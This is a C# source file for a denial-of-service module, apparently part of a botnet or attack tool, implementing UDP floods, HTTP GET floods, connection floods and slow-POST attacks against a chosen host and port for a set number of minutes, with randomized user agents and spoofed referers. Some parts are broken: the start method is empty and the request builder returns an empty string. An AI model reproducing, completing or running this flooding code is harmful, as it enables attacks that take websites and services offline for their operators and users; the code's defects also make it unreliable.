using System;
using System.Net;
using System.Text;
using System.Threading;
using System.Net.Sockets;

using T.Utilities;

namespace T.Functions
{
    class Ddos
    {
        int _iPort, _iTime;
        string _strHost, _strType;
        public Ddos(string strRemoteHost, int iPort, int iTime, string strType)
        {
            if (string.IsNullOrEmpty(strRemoteHost) || string.IsNullOrEmpty(strType))
                throw new Exception("Invalid Parameters.");
            _iTime = Environment.TickCount + (iTime * 60000);
            _iPort = iPort;
            _strHost = strRemoteHost;
            _strType = strType;
        }

        public void Start()
        {
            
        }

        void Send()
        {
            while (Environment.TickCount < _iTime)
            {
                IPEndPoint ipEndPoint = new IPEndPoint(Utils.ResolveHost(this._strHost), this._iPort);

                Socket s = new Socket(AddressFamily.InterNetwork, this._strType == "Udp" ? SocketType.Dgram : SocketType.Stream, this._strType == "Udp" ? ProtocolType.Udp : ProtocolType.Tcp);

                int iPort = _iPort == 0 ? Utils.RandomInt(1, 65500) : _iPort;

                byte[] arr_bPacket = null;

                switch (this._strType)
                {
                    case "Udpflood":
                        arr_bPacket = Utils.GetBytes(Utils.RandomString(Utils.RandomInt(128, 512)));
                        s.BeginSendTo(arr_bPacket, 0, arr_bPacket.Length, SocketFlags.None, (EndPoint)ipEndPoint, new AsyncCallback(SendToCallback), s);
                        break;
                    case "Httpflood":
                        arr_bPacket = Utils.GetBytes(this.BuildPacket(false, -1));

                        s.Connect((EndPoint)ipEndPoint);
                        s.Send(arr_bPacket);
                        s.Close();
                        break;
                    case "Condis":
                        s.BeginConnect((EndPoint)ipEndPoint, new AsyncCallback(ConnectCallback), s);
                        break;
                    case "Slowpost":
                        int iPacketSize = Utils.RandomInt(128,512);
                        int iSent = 0;
                        arr_bPacket = Utils.GetBytes(this.BuildPacket(true, iPacketSize));
                        s.Connect((EndPoint)ipEndPoint);
                        s.Send(arr_bPacket);
                        while (iSent < iPacketSize)
                        {
                            iSent += s.Send(Utils.GetBytes(Utils.RandomString(1)));
                            Thread.Sleep(100);
                        }
                        s.Send(Utils.GetBytes("Connection: close"));
                        s.Close();
                        break;
                    default: break;
                }

                GC.Collect();
                Thread.Sleep(10);
            }
        }

        void SendToCallback(IAsyncResult iar)
        {
            Socket s = (Socket)iar.AsyncState;
            s.EndSendTo(iar);
        }

        void ConnectCallback(IAsyncResult iar)
        {
            Socket s = (Socket)iar.AsyncState;
            s.EndConnect(iar);

            s.Close();
        }

        string[] arr_strReferers = new string[] { "http://google.com", "http://youtube.com", "http://redtube.com", "http://pornhub.com", "http://facebook.com", "http://twitter.com", "http://myspace.com", "http://brazzers.com" };
        string BuildPacket(bool bIsSlow, int iPacketSize)
        {
            StringBuilder sbBuilder = new StringBuilder();
            sbBuilder.AppendLine(bIsSlow ? "POST / HTTP/1.1" : "GET / HTTP/1.1");
            sbBuilder.AppendLine(string.Format("Host: {0}", this._strHost));
            sbBuilder.AppendLine(string.Format("User-Agent: {0}", Utils.RandomString(Utils.RandomInt(15,35))));
            sbBuilder.AppendLine(string.Format("Referer: {0}", arr_strReferers[Utils.RandomInt(0, arr_strReferers.Length)]));
            if (bIsSlow)
            {
                sbBuilder.AppendLine(string.Format("Content-Length: {0}", iPacketSize));
                sbBuilder.AppendLine();
                sbBuilder.AppendLine();
            }
            if(!bIsSlow)
                sbBuilder.AppendLine("Connection: KeepAlive");
            return string.Empty;
        }
    }
}